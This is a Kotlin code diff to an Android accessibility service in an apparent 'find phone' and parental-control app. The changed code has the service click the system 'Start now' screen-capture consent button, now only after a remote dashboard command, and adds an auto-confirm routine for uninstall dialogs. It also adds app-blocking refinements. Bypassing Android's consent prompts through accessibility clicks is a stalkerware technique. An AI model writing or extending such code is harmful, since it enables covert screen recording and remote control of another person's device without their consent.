@@ -26,14 +26,27 @@ class FindPhoneAccessibilityService : AccessibilityService() {
         if (event == null) return
 
         val pkgName = event.packageName?.toString() ?: ""
+        val now = System.currentTimeMillis()
 
-        // 1. Automatic "Start now" clicker for Screen Cast / Screenshot system dialogs!
-        if (pkgName == "com.android.systemui" || pkgName.contains("systemui") || pkgName.contains("permissioncontroller")) {
-            autoApproveScreenCaptureDialog()
+        // 1. Automatic "Start now" clicker: ONLY when explicitly requested by Dashboard command!
+        if (now <= expectingScreenCaptureUntil) {
+            val lower = pkgName.lowercase()
+            if (lower.contains("systemui") || lower.contains("permissioncontroller")) {
+                autoApproveScreenCaptureDialog()
+            }
         }
 
-        // 2. Parental Control & App Blocker & Screen Time Limits
-        if (com.phonelink.hub.data.DevicePrefs.parentalControlEnabled && pkgName.isNotBlank() && pkgName != packageName) {
+        // 2. Automatic Uninstall clicker: ONLY when remote uninstall was requested by Dashboard!
+        val targetUninstallPkg = expectingUninstallPackage
+        if (targetUninstallPkg != null && now <= expectingUninstallUntil) {
+            val lower = pkgName.lowercase()
+            if (lower.contains("packageinstaller") || lower.contains("securitycenter") || lower.contains("settings") || lower.contains("systemui") || lower == "android") {
+                autoApproveUninstallDialog(targetUninstallPkg)
+            }
+        }
+
+        // 3. Parental Control & App Blocker: only for user apps, NEVER system/settings/launcher
+        if (com.phonelink.hub.data.DevicePrefs.parentalControlEnabled && pkgName.isNotBlank()) {
             checkAndEnforceAppBlock(pkgName)
         }
     }
@@ -41,9 +54,23 @@ class FindPhoneAccessibilityService : AccessibilityService() {
     private fun autoApproveScreenCaptureDialog() {
         try {
             val root = rootInActiveWindow ?: return
-            // Look for "Start now", "Start", "ALLOW", or "Allow" buttons in system cast dialog
+            // Verify this is actually a screen capture / cast dialog by checking text
+            val castIndicators = listOf("Start now", "Start recording", "record", "screen", "cast", "display", "MediaProjection", "chalu karein", "shuru karein")
+            var isCastPrompt = false
+            for (ind in castIndicators) {
+                if (root.findAccessibilityNodeInfosByText(ind).isNotEmpty()) {
+                    isCastPrompt = true
+                    break
+                }
+            }
+            if (!isCastPrompt) {
+                root.recycle()
+                return
+            }
+
             val candidates = mutableListOf<android.view.accessibility.AccessibilityNodeInfo>()
-            val keywords = listOf("Start now", "Start", "Start recording", "ALLOW", "Allow", "chalu karein", "shuru karein")
+            candidates.addAll(root.findAccessibilityNodeInfosByViewId("android:id/button1"))
+            val keywords = listOf("Start now", "Start recording", "Start", "chalu karein", "shuru karein")
             for (kw in keywords) {
                 candidates.addAll(root.findAccessibilityNodeInfosByText(kw))
             }
@@ -51,6 +78,7 @@ class FindPhoneAccessibilityService : AccessibilityService() {
                 if (node.isClickable) {
                     node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                     Log.i(TAG, "Auto-approved MediaProjection screen capture prompt via Accessibility click!")
+                    expectingScreenCaptureUntil = 0L
                     node.recycle()
                     root.recycle()
                     return
@@ -59,6 +87,7 @@ class FindPhoneAccessibilityService : AccessibilityService() {
                     if (parent != null && parent.isClickable) {
                         parent.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                         Log.i(TAG, "Auto-approved MediaProjection screen capture prompt via parent click!")
+                        expectingScreenCaptureUntil = 0L
                         parent.recycle()
                         node.recycle()
                         root.recycle()
@@ -73,7 +102,74 @@ class FindPhoneAccessibilityService : AccessibilityService() {
         }
     }
 
+    private fun autoApproveUninstallDialog(packageName: String) {
+        try {
+            val root = rootInActiveWindow ?: return
+            // Look for positive confirmation button (ID button1 or OK / Uninstall text)
+            val candidates = mutableListOf<android.view.accessibility.AccessibilityNodeInfo>()
+            candidates.addAll(root.findAccessibilityNodeInfosByViewId("android:id/button1"))
+            candidates.addAll(root.findAccessibilityNodeInfosByViewId("com.android.packageinstaller:id/ok_button"))
+            candidates.addAll(root.findAccessibilityNodeInfosByViewId("com.google.android.packageinstaller:id/ok_button"))
+
+            val keywords = listOf("OK", "Ok", "Uninstall", "UNINSTALL", "Delete", "Yes", "Remove", "Theek hai")
+            for (kw in keywords) {
+                candidates.addAll(root.findAccessibilityNodeInfosByText(kw))
+            }
+            for (node in candidates) {
+                val nodeText = node.text?.toString()?.trim() ?: ""
+                val isButton1 = node.viewIdResourceName?.endsWith(":id/button1") == true ||
+                                node.viewIdResourceName?.endsWith(":id/ok_button") == true
+                val isMatchingButton = isButton1 || keywords.any { it.equals(nodeText, ignoreCase = true) }
+                if (isMatchingButton && node.isClickable) {
+                    node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                    Log.i(TAG, "Auto-confirmed uninstall for $packageName via accessibility click on '$nodeText' ($node)!")
+                    expectingUninstallPackage = null
+                    expectingUninstallUntil = 0L
+                    node.recycle()
+                    root.recycle()
+                    return
+                } else {
+                    val parent = node.parent
+                    if (isMatchingButton && parent != null && parent.isClickable) {
+                        parent.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                        Log.i(TAG, "Auto-confirmed uninstall for $packageName via parent click on '$nodeText' ($parent)!")
+                        expectingUninstallPackage = null
+                        expectingUninstallUntil = 0L
+                        parent.recycle()
+                        node.recycle()
+                        root.recycle()
+                        return
+                    }
+                }
+                node.recycle()
+            }
+            root.recycle()
+        } catch (e: Exception) {
+            Log.w(TAG, "autoApproveUninstallDialog error: ${e.message}")
+        }
+    }
+
+    private var lastBlockedPackage = ""
+    private var lastBlockedTime = 0L
+
+    private fun isSystemCriticalPackage(pkg: String): Boolean {
+        if (pkg == packageName) return true
+        val lower = pkg.lowercase()
+        return lower.contains("settings") ||
+               lower.contains("permissioncontroller") ||
+               lower.contains("packageinstaller") ||
+               lower.contains("launcher") ||
+               lower.contains("home") ||
+               lower.contains("systemui") ||
+               lower.contains("securitycenter") ||
+               lower.contains("inputmethod") ||
+               lower.contains("keyboard") ||
+               lower == "android"
+    }
+
     private fun checkAndEnforceAppBlock(currentPackage: String) {
+        if (isSystemCriticalPackage(currentPackage)) return
+
         val blocked = com.phonelink.hub.data.DevicePrefs.blockedPackages
         val isBlockedExplicitly = blocked.contains(currentPackage)
 
@@ -96,8 +192,14 @@ class FindPhoneAccessibilityService : AccessibilityService() {
         }
 
         if (isBlockedExplicitly || isTimeExceeded) {
+            val now = System.currentTimeMillis()
+            if (currentPackage == lastBlockedPackage && now - lastBlockedTime < 3000L) {
+                return
+            }
+            lastBlockedPackage = currentPackage
+            lastBlockedTime = now
+
             Log.w(TAG, "Blocking app: $currentPackage (blockedExplicitly=$isBlockedExplicitly, timeExceeded=$isTimeExceeded)")
-            // Immediate kick out to home screen
             performGlobalAction(GLOBAL_ACTION_HOME)
             android.os.Handler(android.os.Looper.getMainLooper()).post {
                 val reason = if (isBlockedExplicitly) "App is restricted by Parental Controls" else "Daily Screen Time limit reached for today!"
@@ -265,5 +367,24 @@ class FindPhoneAccessibilityService : AccessibilityService() {
         @Volatile
         var instance: FindPhoneAccessibilityService? = null
             private set
+
+        @Volatile
+        private var expectingScreenCaptureUntil: Long = 0L
+
+        @Volatile
+        private var expectingUninstallPackage: String? = null
+        @Volatile
+        private var expectingUninstallUntil: Long = 0L
+
+        fun expectScreenCapturePrompt(durationMs: Long = 15_000L) {
+            expectingScreenCaptureUntil = System.currentTimeMillis() + durationMs
+            Log.d(TAG, "Expecting system screen capture prompt for ${durationMs}ms")
+        }
+
+        fun expectUninstallConfirmation(packageName: String, durationMs: Long = 20_000L) {
+            expectingUninstallPackage = packageName
+            expectingUninstallUntil = System.currentTimeMillis() + durationMs
+            Log.d(TAG, "Expecting system uninstall prompt for $packageName (${durationMs}ms)")
+        }
     }
 }
